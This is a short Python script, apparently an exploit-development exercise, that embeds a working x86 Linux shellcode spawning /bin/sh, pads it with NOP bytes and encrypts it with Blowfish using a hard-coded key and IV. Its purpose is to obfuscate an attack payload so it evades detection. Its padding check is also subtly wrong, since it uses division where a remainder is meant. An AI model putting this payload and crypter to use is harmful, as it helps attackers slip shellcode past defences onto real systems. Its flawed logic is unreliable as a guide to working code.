# Author: Xavi Beltran 
# Date: 13/05/2019

# Modules
import blowfish

# Shellcode
scd = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
scd_len = len(scd)
print ('[+] Shellcode length is %d' % scd_len)

# Padding
rem = scd_len / 8
if rem == 0:
	print ('[+] Shellcode is multiple of 8. No padding needed')
else:
	print ('[+] Shellcode is not multiple of 8. Paddind needed')
	block_number = round(scd_len / 8) +1 
	print ('[+] Number of blocks needed: %d' % block_number)
	padding = 8 * block_number - scd_len
	print ('[+] Padding needed: %d' % padding)
	scd = scd + b'\x90'*padding


cipher = blowfish.Cipher(b"xavi")

data = scd
iv = b'88888888'
data_encrypted = b"".join(cipher.encrypt_cbc(data, iv))
print ('[+] Blowfish encryption finished:')
print (data_encrypted)
